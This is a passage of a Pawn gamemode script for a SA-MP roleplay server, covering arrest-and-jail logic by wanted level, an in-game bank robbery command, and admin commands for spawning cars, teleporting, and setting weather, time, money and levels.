						    PlayerInfo[id][pVirtualPD] = 0;
						    Update(id, pVirtualPDx);
						}
						format(string, sizeof(string), "%s arrested suspect %s, issuing a fine of $14000 with a sentence of 960 seconds.", sendername, giveplayer);
						SendClientMessageToAll(COLOR_ERROR, string);
						TogglePlayerControllable(id, 0);
						SetTimerEx("UnFreezeStation", 1000, false, "i", id);
						return 1;
					}
					if(PlayerInfo[id][pWantedLevel] == 4)
					{
						GivePlayerCash(id, -16000);
						new str23[256];
						new idfac;
						idfac = PlayerInfo[playerid][pMember];
                        DynamicFactions[idfac][fBank] += 16000;
						mysql_format(SQL,str23,sizeof(str23),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='%d'", DynamicFactions[idfac][fBank], idfac);
						mysql_tquery(SQL,str23,"","");
						ResetPlayerWeaponsEx(id);
      					ResetPlayerWeapons(id);
						JailPrice[id] = 200000;
						PlayerInfo[id][pJailTime] = 18 * 60;
						SetPlayerWantedLevel(id, 0);
						DestroyDynamic3DTextLabel(WantedScris[playerid]);
						PlayerTextDrawHide(id, WantedText[id]);
						SetPlayerInterior(id, 6);
		                new rand;
						rand = random(sizeof(gRandomJailSpawns));
						SetPlayerPosEx(id,gRandomJailSpawns[rand][0],gRandomJailSpawns[rand][1],gRandomJailSpawns[rand][2]);
						format(string, sizeof(string), "You have been arrested by %s for %d seconds, and issued a fine of $16000.", sendername, PlayerInfo[id][pJailTime]);
						SendClientMessage(id, COLOR_LIGHTBLUE, string);
						PlayerInfo[id][pJailed] = 1;
						PlayerInfo[id][pArrested] += 1;
						PlayerInfo[id][pWantedLevel] = 0;
						WantedPoints[id] = 0;
						arrestcop[id] = playerid;
						if(CP[id] == 50)
						{
							DisablePlayerCheckpoint(id);
							CP[id] = 0;
						}
                        Update(id,pJailedx);
                        Update(id,pJailTimex);
						Update(playerid,pCashx);
						Update(id,pCashx);
						Update(id,pWantedLevelx);
						SetPlayerSkin(id, PlayerInfo[id][pModel]);
						if(PlayerCuffed2[id] == 1)
						{
						    PlayerCuffed2[id] = 0;
					    	SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
					    	RemovePlayerAttachedObject(id,1);
					    	TogglePlayerControllable(id, 1);
						}
						if(IsPlayerInRangeOfPoint(playerid, 4,2282.1289,2425.7620,3.4692))
						{
						    SetPlayerVirtualWorld(id, 3);
						    PlayerInfo[id][pVirtualPD] = 3;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,1526.2357,-1678.0305,5.8906))
						{
						    SetPlayerVirtualWorld(id, 0);
						    PlayerInfo[id][pVirtualPD] = 0;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,268.0995,82.1610,1001.0391) && GetPlayerVirtualWorld(playerid) == 3)
						{
						    SetPlayerVirtualWorld(id, 3);
						    PlayerInfo[id][pVirtualPD] = 3;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,268.0995,82.1610,1001.0391) && GetPlayerVirtualWorld(playerid) == 0)
						{
						    SetPlayerVirtualWorld(id, 0);
						    PlayerInfo[id][pVirtualPD] = 0;
						    Update(id, pVirtualPDx);
						}
						format(string, sizeof(string), "%s arrested suspect %s, issuing a fine of $16000 with a sentence of 1080 seconds.", sendername, giveplayer);
						SendClientMessageToAll(COLOR_ERROR, string);
						TogglePlayerControllable(id, 0);
						SetTimerEx("UnFreezeStation", 1000, false, "i", id);
						return 1;
					}
					if(PlayerInfo[id][pWantedLevel] == 5)
					{
						GivePlayerCash(id, -18000);
						new str23[256];
						new idfac;
						idfac = PlayerInfo[playerid][pMember];
                        DynamicFactions[idfac][fBank] += 18000;
						mysql_format(SQL,str23,sizeof(str23),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='%d'", DynamicFactions[idfac][fBank], idfac);
						mysql_tquery(SQL,str23,"","");
						ResetPlayerWeaponsEx(id);
						ResetPlayerWeapons(id);
						JailPrice[id] = 250000;
						PlayerInfo[id][pJailTime] = 20 * 60;
						SetPlayerWantedLevel(id, 0);
						DestroyDynamic3DTextLabel(WantedScris[playerid]);
						PlayerTextDrawHide(id, WantedText[id]);
						SetPlayerInterior(id, 6);
		                new rand;
						rand = random(sizeof(gRandomJailSpawns));
						SetPlayerPosEx(id,gRandomJailSpawns[rand][0],gRandomJailSpawns[rand][1],gRandomJailSpawns[rand][2]);
						format(string, sizeof(string), "You have been arrested by %s for %d seconds, and issued a fine of $18000.", sendername, PlayerInfo[id][pJailTime]);
						SendClientMessage(id, COLOR_LIGHTBLUE, string);
						PlayerInfo[id][pJailed] = 1;
						PlayerInfo[id][pArrested] += 1;
						PlayerInfo[id][pWantedLevel] = 0;
						WantedPoints[id] = 0;
						arrestcop[id] = playerid;
						if(CP[id] == 50)
						{
							DisablePlayerCheckpoint(id);
							CP[id] = 0;
						}
                        Update(id,pJailedx);
                        Update(id,pJailTimex);
						Update(playerid,pCashx);
						Update(id,pCashx);
						Update(id,pWantedLevelx);
						SetPlayerSkin(id, PlayerInfo[id][pModel]);
						if(PlayerCuffed2[id] == 1)
						{
						    PlayerCuffed2[id] = 0;
					    	SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
					    	RemovePlayerAttachedObject(id,1);
					    	TogglePlayerControllable(id, 1);
						}
						if(IsPlayerInRangeOfPoint(playerid, 4,2282.1289,2425.7620,3.4692))
						{
						    SetPlayerVirtualWorld(id, 3);
						    PlayerInfo[id][pVirtualPD] = 3;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,1526.2357,-1678.0305,5.8906))
						{
						    SetPlayerVirtualWorld(id, 0);
						    PlayerInfo[id][pVirtualPD] = 0;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,268.0995,82.1610,1001.0391) && GetPlayerVirtualWorld(playerid) == 3)
						{
						    SetPlayerVirtualWorld(id, 3);
						    PlayerInfo[id][pVirtualPD] = 3;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,268.0995,82.1610,1001.0391) && GetPlayerVirtualWorld(playerid) == 0)
						{
						    SetPlayerVirtualWorld(id, 0);
						    PlayerInfo[id][pVirtualPD] = 0;
						    Update(id, pVirtualPDx);
						}
						format(string, sizeof(string), "%s arrested suspect %s, issuing a fine of $18000 with a sentence of 1200 seconds.", sendername, giveplayer);
						SendClientMessageToAll(COLOR_ERROR, string);
						TogglePlayerControllable(id, 0);
						SetTimerEx("UnFreezeStation", 1000, false, "i", id);
						return 1;
					}
					if(PlayerInfo[id][pWantedLevel] == 6)
					{
						GivePlayerCash(id, -20000);
						new str23[256];
						new idfac;
						idfac = PlayerInfo[playerid][pMember];
                        DynamicFactions[idfac][fBank] += 20000;
						mysql_format(SQL,str23,sizeof(str23),"UPDATE `factions` SET `Bank`='%d' WHERE `ID`='%d'", DynamicFactions[idfac][fBank], idfac);
						mysql_tquery(SQL,str23,"","");
						ResetPlayerWeaponsEx(id);
						ResetPlayerWeapons(id);
						JailPrice[id] = 300000;
						PlayerInfo[id][pJailTime] = 24 * 60;
						SetPlayerWantedLevel(id, 0);
						DestroyDynamic3DTextLabel(WantedScris[playerid]);
						PlayerTextDrawHide(id, WantedText[id]);
						SetPlayerInterior(id, 6);
		                new rand;
						rand = random(sizeof(gRandomJailSpawns));
						SetPlayerPosEx(id,gRandomJailSpawns[rand][0],gRandomJailSpawns[rand][1],gRandomJailSpawns[rand][2]);
						format(string, sizeof(string), "You have been arrested by %s for %d seconds, and issued a fine of $20000.", sendername, PlayerInfo[id][pJailTime]);
						SendClientMessage(id, COLOR_LIGHTBLUE, string);
						PlayerInfo[id][pJailed] = 1;
						PlayerInfo[id][pArrested] += 1;
						PlayerInfo[id][pWantedLevel] = 0;
						WantedPoints[id] = 0;
						arrestcop[id] = playerid;
						if(CP[id] == 50)
						{
							DisablePlayerCheckpoint(id);
							CP[id] = 0;
						}
                        Update(id,pJailedx);
                        Update(id,pJailTimex);
						Update(playerid,pCashx);
						Update(id,pCashx);
						Update(id,pWantedLevelx);
						SetPlayerSkin(id, PlayerInfo[id][pModel]);
						if(PlayerCuffed2[id] == 1)
						{
						    PlayerCuffed2[id] = 0;
					    	SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
					    	RemovePlayerAttachedObject(id,1);
					    	TogglePlayerControllable(id, 1);
						}
						if(IsPlayerInRangeOfPoint(playerid, 4,2282.1289,2425.7620,3.4692))
						{
						    SetPlayerVirtualWorld(id, 3);
						    PlayerInfo[id][pVirtualPD] = 3;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,1526.2357,-1678.0305,5.8906))
						{
						    SetPlayerVirtualWorld(id, 0);
						    PlayerInfo[id][pVirtualPD] = 0;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,268.0995,82.1610,1001.0391) && GetPlayerVirtualWorld(playerid) == 3)
						{
						    SetPlayerVirtualWorld(id, 3);
						    PlayerInfo[id][pVirtualPD] = 3;
						    Update(id, pVirtualPDx);
						}
						else if(IsPlayerInRangeOfPoint(playerid, 4,268.0995,82.1610,1001.0391) && GetPlayerVirtualWorld(playerid) == 0)
						{
						    SetPlayerVirtualWorld(id, 0);
						    PlayerInfo[id][pVirtualPD] = 0;
						    Update(id, pVirtualPDx);
						}
						format(string, sizeof(string), "%s arrested suspect %s, issuing a fine of $20000 with a sentence of 1440 seconds.", sendername, giveplayer);
						SendClientMessageToAll(COLOR_ERROR, string);
						TogglePlayerControllable(id, 0);
						SetTimerEx("UnFreezeStation", 1000, false, "i", id);
						return 1;
					}
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not near the jail, can't arrest.");
			}
			else return SCM(playerid,COLOR_SERVER,"{C1F589}This player is not near you.");
		}
		else return SCM(playerid,COLOR_SERVER,"{C1F589}Error: Player not connected.");
	}
	else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Cop/FBI/National Guard.");
	return 1;
}
CMD:spawncar(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 5)
	{
		new model,color1,color2,sendername[25],string[256];
		if(sscanf(params, "iii", model, color1, color2)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/spawncar <Model> <Color1> <Color2>");
		if(model < 400 || model > 611) return SCM(playerid,COLOR_SERVER,"{FFB870}Invalid car ID! (400-611)");
		if(color1 > 255 || color1 < 0) return SendClientMessage(playerid, COLOR_RED, "Invalid car Color! (0-255)");
        if(color2 < 0 || color2 > 255) return SendClientMessage(playerid, COLOR_RED, "Invalid car Color! (0-255)");
    	new Float:X,Float:Y,Float:Z;
		GetPlayerPos(playerid, X,Y,Z);
     	new carid = AddStaticVehicleEx(model, X,Y,Z, 0.0,  color1, color2,1800000);
		Carspawn[carid] = carid;
       	GetPlayerName(playerid, sendername, sizeof(sendername));
       	new vehicles = GetVehicleModel(carid) - 400;
    	format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s has spawned a %s.",sendername,aVehicleNames[vehicles]);
    	ABroadCast(COLOR_AdminWarn, string, 4);
		format(string,sizeof(string),"VehLog: %s has spawned car model %d.",sendername,model);
    	Adminlog(string);
		LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		PutPlayerInVehicleEx(playerid, carid, 0);
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:destroycarspawn(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] < 6) return SCM(playerid,COLOR_ERROR, AdminOnly);
	if(Destroycar == 0)
	{
	    Destroycar = 1;
	    SCM(playerid,COLOR_SERVER,"Destroy car spawn is enable.");
	}
	else if(Destroycar == 1)
	{
	    Destroycar = 0;
	    SCM(playerid,COLOR_SERVER,"Destroy car spawn is disable.");
	}
	return 1;
}
CMD:removespawncarid(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
	    new id,string[128],sendername[30];
	    if(sscanf(params, "d", id)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/removespawncarid <Car ID>");
		if(Carspawn[id] != 0)
		{
		    DestroyVehicle(id);
			Carspawn[id] = 0;
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string,sizeof(string),"[Admin-Warn]: {FFFFFF}Admin %s despawned vehicle %d.",sendername,id);
			ABroadCast(COLOR_AdminWarn,string,1);
		}
		else return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}This is not spawned car.");
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:removeallspawncar(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		new string[128],sendername[30];
		for(new i = 1; i < MAX_VEHICLES; i++)
		{
			if(Carspawn[i] != 0)
			{
				DestroyVehicle(Carspawn[i]);
				Carspawn[i] = 0;
			}
		}
		GetPlayerName(playerid, sendername, sizeof(sendername));
		format(string,sizeof(string),"[Admin-Warn]: {FFFFFF}Admin %s despawned all vehicles.",sendername);
		ABroadCast(COLOR_AdminWarn,string,1);
		Destroycar = 0;
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:checkspawncar(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		new string[64];
		for(new i = 1; i < MAX_VEHICLES; i++)
		{
			if(Carspawn[i] != 0)
			{
			    format(string,sizeof(string),"Car ID: %d",Carspawn[i]);
				SCM(playerid,COLOR_SERVER,string);
			}
		}
	}
	else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:garage(playerid, params[])
{
    if (IsPlayerInRangeOfPoint(playerid,2,1594.7660,-1619.7109,13.4093))
	{
 			new tmpcar = GetPlayerVehicleID(playerid);
			if (GetPlayerState(playerid) == 2)
			{
				SetVehiclePos(tmpcar, 1292.7828,6.8377,1001.0078);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			}
			else
			{
				SetPlayerPosEx(playerid, 1292.7828,6.8377,1001.0078);
			}
			SetPlayerInterior(playerid,18);
			LinkVehicleToInterior(tmpcar,18);
			PlayerInfo[playerid][pInt] = 18;
			if(InHouse[playerid] > -1)
			{
			   if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
			}
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,0);
			SetVehicleVirtualWorld(tmpcar,0);
			return 1;
	}
	else if (IsPlayerInRangeOfPoint(playerid,2,1292.7828,6.8377,1001.0078) && GetPlayerVirtualWorld(playerid) == 0)
	{
 			new tmpcar = GetPlayerVehicleID(playerid);
			if (GetPlayerState(playerid) == 2)
			{
				SetVehiclePos(tmpcar, 1594.7660,-1619.7109,13.4093);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			}
			else
			{
				SetPlayerPosEx(playerid, 1594.7660,-1619.7109,13.4093);
			}
			SetPlayerInterior(playerid,0);
			LinkVehicleToInterior(tmpcar,0);
			PlayerInfo[playerid][pInt] = 0;
			if(InHouse[playerid] > -1)
			{
			    if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
			}
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,0);
			SetVehicleVirtualWorld(tmpcar,0);
			return 1;
	}
	else if (IsPlayerInRangeOfPoint(playerid,2,1059.7028,-345.8912,73.9922))
	{
		if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
		{
 			new tmpcar = GetPlayerVehicleID(playerid);
			if (GetPlayerState(playerid) == 2)
			{
				SetVehiclePos(tmpcar, 1292.7828,6.8377,1001.0078);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			}
			else
			{
				SetPlayerPosEx(playerid, 1292.7828,6.8377,1001.0078);
			}
			SetPlayerInterior(playerid,18);
			LinkVehicleToInterior(tmpcar,18);
			PlayerInfo[playerid][pInt] = 18;
			if(InHouse[playerid] > -1)
			{
			    if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
			}
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,676);
			SetVehicleVirtualWorld(tmpcar,676);
			return 1;
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, "You are not a Hitman.");
		}
	}
	return 1;
}
CMD:exitgaragehitman(playerid, params[])
{
    if (IsPlayerInRangeOfPoint(playerid,2,1292.7828,6.8377,1001.0078) && GetPlayerVirtualWorld(playerid) == 676)
	{
 			new tmpcar = GetPlayerVehicleID(playerid);
			if (GetPlayerState(playerid) == 2)
			{
				SetVehiclePos(tmpcar, 1059.7028,-345.8912,73.9922);
				TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
			}
			else
			{
				SetPlayerPosEx(playerid, 1059.7028,-345.8912,73.9922);
			}
			SetPlayerInterior(playerid,0);
			LinkVehicleToInterior(tmpcar,0);
			PlayerInfo[playerid][pInt] = 0;
			if(InHouse[playerid] > -1)
			{
			   if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
			}
			InHQ[playerid] = -1;
			InHouse[playerid] = -1;
			InBussines[playerid] = -1;
			SetPlayerVirtualWorld(playerid,0);
			SetVehicleVirtualWorld(tmpcar,0);
			return 1;
	}
	return 1;
}
CMD:rob(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_ERROR, "You need a minimum level 3.");
	if(PlayerInfo[playerid][pWantedLevel] > 0) return SendClientMessage(playerid, COLOR_ERROR, "You can not rob the bank because you wanted.");
	if(BusinessRob[playerid] > 0) return SCM(playerid, COLOR_ERROR, "Already rob bank.");
	if(PlayerInfo[playerid][pRob] >= 10 && PlayerInfo[playerid][pPremiumAccount] == 0 || PlayerInfo[playerid][pRob] >= 8 && PlayerInfo[playerid][pPremiumAccount] > 0)
    {
		if(IsACop(playerid)) return SCM(playerid,COLOR_SERVER,"{FFB870}You're a cop.");
		if(InBussines[playerid] != -1 && IsPlayerInRangeOfPoint(playerid, 3.0, 1060.1135,-391.6655,9.2367))
		{
			DisablePlayerCheckpoint(playerid);
			ApplyAnimation(playerid, "ROB_BANK", "CAT_Safe_Rob", 4.0, 1, 0, 0, 0, 0);
			RobTimer[playerid] = 10;
			BusinessRob[playerid] = 3;
			if(PlayerInfo[playerid][pPremiumAccount] == 0)
			{
				PlayerInfo[playerid][pRob] -= 10;
			}
			else if(PlayerInfo[playerid][pPremiumAccount] == 1)
			{
				PlayerInfo[playerid][pRob] -= 8;
			}
			SetPlayerPos(playerid, 1060.1135,-391.6655,9.2367);
			//|----------rob camera 1----------|
			InterpolateCameraPos(playerid, 1057.005859, -386.414611, 10.466653, 1061.207031, -389.834075, 9.238589, 3000);
			InterpolateCameraLookAt(playerid, 1059.316650, -390.278747, 8.292111, 1058.271850, -393.802612, 8.441538, 3000);
			ClearAnimations(playerid);
			TogglePlayerControllable(playerid, 0);
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			SCM(playerid, COLOR_SERVER, "");
			ResetPlayerWeaponsEx(playerid);
		    ResetPlayerWeapons(playerid);
			RobTime[playerid] = 10;
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "To rob the bank need to stay near the bank vault.");
	}
	else
	{
		if(PlayerInfo[playerid][pPremiumAccount] == 0)
		{
			SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You have 10 points Plunder.");
		}
		else if(PlayerInfo[playerid][pPremiumAccount] == 1)
		{
			SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You have 8 points robbery.");
		}
		return 1;
	}
	return 1;
}
CMD:tod(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] < 3) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		new hour,string[60],sendername[25];
		if(sscanf(params, "i", hour)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/tod <Time>");
        SetWorldTimeEx(hour);
        GetPlayerName(playerid, sendername, sizeof(sendername));
		format(string, sizeof(string), "{ba9789}Warning: %s has set the time to %d hours.", sendername,hour);
		ABroadCast(COLOR_SERVER,string, 3);
		return 1;
	}
	return 1;
}
CMD:weatherall(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] < 4) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		new weather,string[60],sendername[25];
		GetPlayerName(playerid,sendername,sizeof(sendername));
		if(sscanf(params, "i",weather)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/weatherall <Weather ID>");
		if(weather < 0||weather > 45) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Weather ID can't be below 0 or above 45.");
		SetWeather(weather);
		format(string, sizeof(string), "{ba9789}Warning: %s has set %d wather.", sendername,weather);
		ABroadCast(COLOR_SERVER,string, 4);
	}
	return 1;
}
CMD:down(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] < 1) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		{
			new id,size;
			if(sscanf(params, "ui",id,size)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/down <Name/Playerid> <Size>");
	    	new Float:slx, Float:sly, Float:slz;
		    if(IsPlayerConnected(id))
		    {
				GetPlayerPos(id, slx, sly, slz);
				SetPlayerPosEx(id, slx, sly, slz-size);
			}
	    	else
	    	{
		    	SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	    	}
		}
	}
	return 1;
}
CMD:slap(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
		{
			new string[64],giveplayer[25],sendername[25],id;
			if(sscanf(params, "u",id)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/slap <Name/Playerid>");
	    	new Float:shealth;
	    	new Float:slx, Float:sly, Float:slz;
		    if(IsPlayerConnected(id))
		    {
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				GetPlayerHealthEx(id, shealth);
				SetPlayerHealthEx(id, shealth-5);
				GetPlayerPos(id, slx, sly, slz);
				SetPlayerPosEx(id, slx, sly, slz+5);
				format(string, 256, "You have slaped %s.",giveplayer);
				SendClientMessage(playerid, COLOR_ERROR, string);
				format(string, 256, "You have been slaped by %s.",sendername);
				SendClientMessage(id, COLOR_ERROR, string);
                format(string, 256, "/slap: %s has slapped %s.", sendername,giveplayer);
				ABroadCast(COLOR_ADMCOMMANDS,string,1);
				HLChat(COLOR_ADMCOMMANDS,string);
			}
	    	else
	    	{
		    	SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	    	}
		}
		else return SendClientMessage(playerid, COLOR_SERVER,"{5CAD5C}Error: Your admin/helper level isn't high enough to use this command.");
	}
	return 1;
}
CMD:money(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		{
			new money,id,string[256],sendername[25],giveplayer[25];
			if(sscanf(params, "ui",id,money)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/money <Name/Playerid> <Amount of Money>");
		    if(IsPlayerConnected(id))
		    {
				ResetPlayerCash(id);
				GivePlayerCash(id, money);
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, 256, "Admin %s has set your money to $%s.", sendername,FormatNumber(money));
				SendClientMessage(id,COLOR_LIGHTBLUE,string);
                format(string, 256, "{ba9789}Warning: Admin %s has set %s's money to $%s.", sendername,giveplayer,FormatNumber(money));
				ABroadCast(COLOR_SERVER,string,5);
				format(string, 256, "Warning: Admin %s has set %s money to $%s.", sendername,giveplayer,FormatNumber(money));
				Adminlog(string);
				Update(id, pCashx);
			}
	    	else
	    	{
		    	SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	    	}
		}
	}
	return 1;
}
CMD:bank(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		new money,id,string[256],sendername[25],giveplayer[25];
		if(sscanf(params, "ui",id,money)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/bank <Name/Playerid> <Amount of Money>");
	    if(IsPlayerConnected(id))
	    {
			sendbankkick[id] = 1;
			GetPlayerName(id, giveplayer, sizeof(giveplayer));
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, 256, "Admin %s has set your bank money to $%s.", sendername,FormatNumber(money));
			SendClientMessage(id,COLOR_LIGHTBLUE,string);
            format(string, 256, "{ba9789}Warning: Admin %s has set %s's bank money to $%s.", sendername,giveplayer,FormatNumber(money));
			ABroadCast(COLOR_SERVER,string,5);
			format(string, 256, "Warning: Admin %s has set %s bank money to $%s.", sendername,giveplayer,FormatNumber(money));
			Adminlog(string);
			new suma[128];
			format(suma, sizeof(suma), "%d",money);
			mysql_format(SQL, string, sizeof(string), "UPDATE `users` SET `Bank2`='%s' WHERE `ID`='%d'", suma, PlayerInfo[id][pSQLID]);
			mysql_tquery(SQL, string, "", "");
			Kick(id);
		}
    	else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:givelevel(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		{
			new money,id,string[256],sendername[25],giveplayer[25];
			if(sscanf(params, "ui",id,money)) return SCM(playerid,0xFFFFFFFF, "{A9C4E4}Usage: {FFFFFF}/givelevel <Name/Playerid> <Level>");
	    	new year, month,day;
	    	getdate(year, month, day);
		    if(IsPlayerConnected(id))
		    {
				PlayerInfo[id][pLevel] += money;
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, 256, "{ba9789}Warning: Admin %s has send %d level %s.", sendername,money,giveplayer);
				ABroadCast(COLOR_SERVER,string,5);
				Update(id, pLevelx);
				SetPlayerScore(id, PlayerInfo[id][pLevel]);
			}
	    	else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
	}
	return 1;
}
CMD:setlevel(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
